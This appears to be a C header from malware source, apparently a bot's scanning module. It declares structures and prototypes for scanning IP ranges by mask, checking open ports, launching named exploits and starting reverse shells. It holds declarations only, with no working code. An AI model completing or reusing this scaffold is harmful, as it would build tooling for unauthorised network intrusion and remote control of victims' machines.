struct scans
/* struct for various scan functions */
{
	int tnum;
	int delay;
	unsigned short port;
	unsigned short port2;
	unsigned short port3;
	char exploit[64];
	char mask[16];
	bool info;
	bool gotinfo;
	bool lgotinfo;
	SOCKET sock;
};

struct exploits
/* struct for use with exploits */
{
	unsigned short port;
	unsigned long ip;
	bool gotinfo;
};

struct rshells
/* struct for rshell_start() function */
{
	int tnum;
	bool gotinfo;
};

unsigned long scan_getnextip(const char *scanmask);

bool scan_checkservers();

bool shell_connect(unsigned long ip, unsigned short port);

void scan_portopen(unsigned long ip, unsigned short port);

unsigned int __stdcall scan_start(void *param);

unsigned int __stdcall scan_listen(void *param);

unsigned int __stdcall rshell_start(void *param);